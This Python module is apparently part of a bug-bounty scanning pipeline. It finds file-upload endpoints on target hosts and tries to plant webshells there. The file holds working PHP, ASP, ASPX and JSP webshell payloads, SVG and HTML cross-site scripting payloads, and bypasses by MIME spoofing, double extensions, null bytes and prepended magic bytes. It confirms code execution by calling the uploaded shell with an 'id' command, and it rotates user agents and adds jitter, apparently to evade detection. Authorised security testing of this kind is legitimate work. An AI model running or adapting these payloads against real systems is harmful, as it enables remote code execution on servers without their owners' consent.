#!/usr/bin/env python3
# modules/step33_file_upload.py — File Upload Vulnerability Engine V7
# NEW MODULE: PHP/ASPX/JSP/SVG/HTML upload bypass → RCE
# Source: Bug Bounty Bootcamp Ch11 — file upload full methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import os, re, time, mimetypes
import urllib.request, urllib.error, urllib.parse
from core.utils import safe_read

# ── Upload endpoints to discover ──────────────────────────────────────────────
UPLOAD_PATHS = [
    "/upload", "/file/upload", "/api/upload", "/api/file/upload",
    "/media/upload", "/image/upload", "/avatar/upload",
    "/profile/upload", "/document/upload", "/attachment/upload",
    "/api/v1/upload", "/api/v2/upload", "/uploads", "/files",
    "/user/avatar", "/profile/avatar", "/api/media",
    "/admin/upload", "/cms/upload", "/content/upload",
]

# ── Webshell payloads ─────────────────────────────────────────────────────────
WEBSHELLS = {
    "php":  b"<?php system($_GET['cmd']); ?>",
    "php2": b"<?php echo shell_exec($_REQUEST['cmd']); ?>",
    "php3": b"<?=`$_GET[c]`?>",                      # short tag bypass
    "phtml":b"<?php passthru($_GET['cmd']); ?>",
    "phar": b"<?php system($_GET['cmd']); ?>",
    "asp":  b"<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll()) %>",
    "aspx": b"<%@ Page Language=\"C#\" %><%= System.Diagnostics.Process.Start(\"cmd\",\"/c \"+Request[\"c\"]) %>",
    "jsp":  b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
}

# ── SVG XSS payload ───────────────────────────────────────────────────────────
SVG_XSS = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
<rect width="100%" height="100%" fill="red"/>
</svg>"""

# ── HTML upload for stored XSS ────────────────────────────────────────────────
HTML_XSS = b"""<html><body>
<img src=x onerror="alert(document.domain)">
<script>alert(document.domain)</script>
</body></html>"""

# ── MIME type spoofing map ────────────────────────────────────────────────────
MIME_BYPASS = [
    # (content_type_to_send, extension, payload_key)
    ("image/jpeg",            ".php",   "php"),
    ("image/png",             ".php",   "php"),
    ("image/gif",             ".php",   "php"),
    ("image/jpeg",            ".php5",  "php"),
    ("image/jpeg",            ".phtml", "phtml"),
    ("image/jpeg",            ".phar",  "phar"),
    ("application/octet-stream",".php", "php"),
    ("image/svg+xml",         ".svg",   None),    # SVG XSS
    ("text/html",             ".html",  None),    # HTML XSS
    ("image/jpeg",            ".aspx",  "aspx"),
    ("image/jpeg",            ".jsp",   "jsp"),
]

# ── Double extension bypass ───────────────────────────────────────────────────
DOUBLE_EXT = [
    ".php.jpg", ".php%00.jpg", ".php\x00.jpg",
    ".php5.jpg", ".phtml.jpg", ".php.png",
    ".asp;.jpg", ".aspx;.jpg",
]

# ── Magic bytes to prepend (bypass file type checks) ─────────────────────────
MAGIC_BYTES = {
    "jpeg": b"\xff\xd8\xff",
    "png":  b"\x89PNG\r\n\x1a\n",
    "gif":  b"GIF89a",
    "pdf":  b"%PDF-",
}

# ── RCE confirmation command ──────────────────────────────────────────────────
RCE_CMD     = "id"
RCE_CONFIRM = re.compile(r'uid=\d+\([\w]+\)\s+gid=\d+', re.I)


class Step33FileUpload:
    """
    File Upload Vulnerability Scanner.
    Bug Bounty Bootcamp Ch11 methodology:
    1. Discover upload endpoints
    2. Test MIME type bypass (send PHP with image/jpeg)
    3. Test double extension (.php.jpg)
    4. Test null byte bypass (.php%00.jpg)
    5. Test magic bytes prepend
    6. Test SVG/HTML for XSS
    7. Verify RCE by requesting uploaded file with ?cmd=id
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files.get("upload_results",
                             f"{p.out}/{p.prefix}_file_upload.txt")
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        urls  = safe_read(p.files.get("urls",""))
        found = 0

        if not live:
            p.log.warn("FileUpload: no live hosts"); return

        auth_h = self._build_auth(p)
        p.log.info(f"FileUpload V7: {len(live)} hosts — MIME+ext+magic bypass + RCE verify")

        # Discover upload endpoints from crawled URLs + known paths
        upload_endpoints = self._discover_uploads(live, urls)
        p.log.info(f"  Upload endpoints found: {len(upload_endpoints)}")

        for url, form_field in upload_endpoints[:15]:
            p.log.info(f"  Testing: {url}")

            # Phase 1: SVG + HTML XSS upload
            r = self._test_xss_upload(url, form_field, auth_h, out)
            found += r

            # Phase 2: MIME type bypass
            r = self._test_mime_bypass(url, form_field, auth_h, out)
            found += r

            # Phase 3: Double extension bypass
            r = self._test_double_ext(url, form_field, auth_h, out)
            found += r

            # Phase 4: Magic bytes prepend
            r = self._test_magic_bytes(url, form_field, auth_h, out)
            found += r

            p.bypass.jitter()

        p.log.success(f"FileUpload V7: {found} findings")

    # ── Discover upload endpoints ─────────────────────────────────────────────
    def _discover_uploads(self, live: list, urls: list) -> list:
        endpoints = []
        seen = set()

        # From known paths
        for host in live[:5]:
            host = host.rstrip("/")
            for path in UPLOAD_PATHS:
                url = host + path
                if url not in seen:
                    resp = self._probe(url)
                    if resp and resp.get("status",0) in (200,405,415,422):
                        endpoints.append((url, "file"))
                        seen.add(url)

        # From crawled URLs
        upload_re = re.compile(r'upload|file|image|avatar|attachment|media', re.I)
        for url in urls:
            if upload_re.search(url) and url not in seen:
                seen.add(url)
                endpoints.append((url, "file"))

        return endpoints[:25]

    # ── Phase 1: SVG + HTML XSS upload ───────────────────────────────────────
    def _test_xss_upload(self, url, field, auth_h, out) -> int:
        found = 0
        tests = [
            ("m7xss.svg",  SVG_XSS,  "image/svg+xml", "SVG XSS"),
            ("m7xss.html", HTML_XSS, "text/html",      "HTML XSS"),
        ]
        for fname, payload, ct, label in tests:
            resp = self._upload(url, field, fname, payload, ct, auth_h)
            if not resp: continue
            body = resp.get("body","")
            st   = resp.get("status",0)

            # Success: file URL returned or 200/201
            if st in (200,201) and self._get_file_url(body, fname):
                file_url = self._get_file_url(body, fname)
                # Verify file is accessible
                verify = self._probe(file_url)
                if verify and verify.get("status",0) == 200:
                    detail = (f"File Upload XSS: {label} uploaded at {file_url} "
                              f"— accessible, triggers XSS when viewed")
                    self._save(out,"high","FILE_UPLOAD_XSS",url,detail)
                    found += 1
            elif st in (200,201) and ".svg" in body or ".html" in body:
                detail = f"File Upload: {label} accepted (status {st})"
                self._save(out,"medium","FILE_UPLOAD_XSS",url,detail)
                found += 1
        return found

    # ── Phase 2: MIME type bypass ─────────────────────────────────────────────
    def _test_mime_bypass(self, url, field, auth_h, out) -> int:
        """
        Bug Bounty Bootcamp Ch11: Send PHP file with image/jpeg MIME type.
        Many servers trust Content-Type, not file content.
        """
        for ct, ext, shell_key in MIME_BYPASS[:8]:
            if shell_key is None: continue
            payload  = WEBSHELLS.get(shell_key, WEBSHELLS["php"])
            # Prepend JPEG magic bytes to bypass content inspection
            content  = MAGIC_BYTES["jpeg"] + b"\n" + payload
            filename = f"m7shell{ext}"

            resp = self._upload(url, field, filename, content, ct, auth_h)
            if not resp: continue
            st   = resp.get("status",0)
            body = resp.get("body","")

            if st in (200,201):
                file_url = self._get_file_url(body, filename)
                if file_url:
                    rce = self._verify_rce(file_url)
                    if rce:
                        detail = (f"File Upload RCE: MIME bypass ({ct}+{ext}) "
                                  f"— shell at {file_url} — id: {rce}")
                        self._save(out,"critical","FILE_UPLOAD_RCE",url,detail)
                        return 1
                    else:
                        detail = (f"File Upload MIME bypass: {ext} accepted with "
                                  f"{ct} — verify manually at {file_url}")
                        self._save(out,"high","FILE_UPLOAD_MIME_BYPASS",url,detail)
                        return 1
        return 0

    # ── Phase 3: Double extension bypass ─────────────────────────────────────
    def _test_double_ext(self, url, field, auth_h, out) -> int:
        for ext in DOUBLE_EXT:
            filename = f"m7shell{ext}"
            payload  = WEBSHELLS["php"]
            resp     = self._upload(url, field, filename, payload,
                                    "image/jpeg", auth_h)
            if not resp: continue
            if resp.get("status",0) in (200,201):
                body = resp.get("body","")
                file_url = self._get_file_url(body, "m7shell")
                if file_url:
                    rce = self._verify_rce(file_url)
                    if rce:
                        detail = (f"File Upload RCE: double extension {ext} "
                                  f"— shell executes, id={rce}")
                        self._save(out,"critical","FILE_UPLOAD_RCE",url,detail)
                        return 1
                    detail = (f"File Upload: double ext {ext} accepted "
                              f"— may be executable at {file_url}")
                    self._save(out,"high","FILE_UPLOAD_DOUBLE_EXT",url,detail)
                    return 1
        return 0

    # ── Phase 4: Magic bytes ──────────────────────────────────────────────────
    def _test_magic_bytes(self, url, field, auth_h, out) -> int:
        """Prepend GIF89a to bypass server-side content inspection."""
        for magic_name, magic in MAGIC_BYTES.items():
            payload  = magic + b"\n" + WEBSHELLS["php"]
            filename = "m7shell.php"
            ct       = "image/gif" if magic_name == "gif" else "image/jpeg"
            resp     = self._upload(url, field, filename, payload, ct, auth_h)
            if not resp: continue
            if resp.get("status",0) in (200,201):
                body = resp.get("body","")
                file_url = self._get_file_url(body, "m7shell")
                if file_url:
                    rce = self._verify_rce(file_url)
                    if rce:
                        detail = (f"File Upload RCE: {magic_name} magic bytes bypass "
                                  f"— shell at {file_url} — id={rce}")
                        self._save(out,"critical","FILE_UPLOAD_RCE",url,detail)
                        return 1
                    detail = (f"File Upload: {magic_name} magic + .php accepted "
                              f"at {file_url}")
                    self._save(out,"high","FILE_UPLOAD_MAGIC",url,detail)
                    return 1
        return 0

    # ── Upload helper ─────────────────────────────────────────────────────────
    def _upload(self, url, field, filename, content, ct, auth_h) -> dict:
        """Multipart form upload."""
        boundary = "m7hunterboundary1337"
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"{field}\"; "
            f"filename=\"{filename}\"\r\n"
            f"Content-Type: {ct}\r\n\r\n"
        ).encode() + content + f"\r\n--{boundary}--\r\n".encode()

        hdrs = {
            **auth_h,
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": self.p.bypass.ua(),
        }
        try:
            req  = urllib.request.Request(url, data=body, headers=hdrs, method="POST")
            resp = urllib.request.urlopen(req, timeout=12)
            return {"status": resp.status,
                    "body": resp.read(50000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: b = e.read(5000).decode("utf-8","ignore")
            except: b = ""
            return {"status": e.code, "body": b}
        except Exception:
            return None

    # ── RCE verification ──────────────────────────────────────────────────────
    def _verify_rce(self, file_url: str) -> str:
        """Request uploaded shell with ?cmd=id to confirm RCE."""
        for cmd_param in ["cmd","c","exec","command"]:
            test_url = f"{file_url}?{cmd_param}={RCE_CMD}"
            try:
                req  = urllib.request.Request(
                    test_url, headers={"User-Agent": self.p.bypass.ua()})
                resp = urllib.request.urlopen(req, timeout=8)
                body = resp.read(10000).decode("utf-8","ignore")
                m = RCE_CONFIRM.search(body)
                if m:
                    return m.group(0)
            except Exception:
                pass
        return ""

    def _get_file_url(self, response_body: str, filename: str) -> str:
        """Extract uploaded file URL from response."""
        patterns = [
            re.compile(r'https?://[^\s"\'<>]+' + re.escape(filename.split(".")[0]), re.I),
            re.compile(r'"url"\s*:\s*"([^"]+' + re.escape(filename.split(".")[0]) + r'[^"]*)"', re.I),
            re.compile(r'"file_path"\s*:\s*"([^"]+)"', re.I),
            re.compile(r'"path"\s*:\s*"([^"]+)"', re.I),
            re.compile(r'/uploads?/[^\s"\'<>]+', re.I),
            re.compile(r'/media/[^\s"\'<>]+', re.I),
            re.compile(r'/files?/[^\s"\'<>]+', re.I),
        ]
        for pat in patterns:
            m = pat.search(response_body)
            if m:
                url = m.group(1) if m.lastindex else m.group(0)
                return url.strip('"\'')
        return ""

    def _probe(self, url, timeout=8) -> dict:
        try:
            req  = urllib.request.Request(url, headers={"User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body": resp.read(10000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": ""}
        except Exception:
            return None

    def _build_auth(self, p) -> dict:
        hdrs = {}
        c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
        a = getattr(p.args,"authorization",None) or getattr(p.args,"auth",None)
        if c: hdrs["Cookie"] = c
        if a: hdrs["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        return hdrs

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "fileupload-v7", response=response, payload=payload)
